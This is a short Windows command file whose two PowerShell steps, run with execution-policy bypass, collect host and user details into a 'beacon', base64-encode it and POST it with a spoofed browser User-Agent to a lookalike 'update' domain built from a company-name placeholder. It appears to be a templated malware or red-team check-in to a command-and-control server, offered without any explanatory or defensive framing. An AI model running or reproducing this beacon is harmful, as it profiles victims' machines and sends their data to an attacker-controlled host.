steps.cmd:
powershell -ep bypass -c "
$beacon = @{
  id = [guid]::NewGuid().ToString().Substring(0,8);
  hostname = $env:COMPUTERNAME;
  user = '{userName}';
  domain = '{companyName}';
  os = (Get-CimInstance Win32_OperatingSystem).Caption;
  arch = $env:PROCESSOR_ARCHITECTURE;
  pid = $PID
} | ConvertTo-Json;
Write-Host $beacon"

powershell -ep bypass -c "
$headers = @{
  'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
  'Accept' = 'text/html,application/json';
  'X-Request-ID' = 'a3f8c2d1';
};
$body = @{ data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($beacon)) };
Invoke-WebRequest -Uri 'https://cdn-assets.{companyName}-update.com/api/v2/check' -Method POST -Headers $headers -Body ($body | ConvertTo-Json) -ContentType 'application/json'"

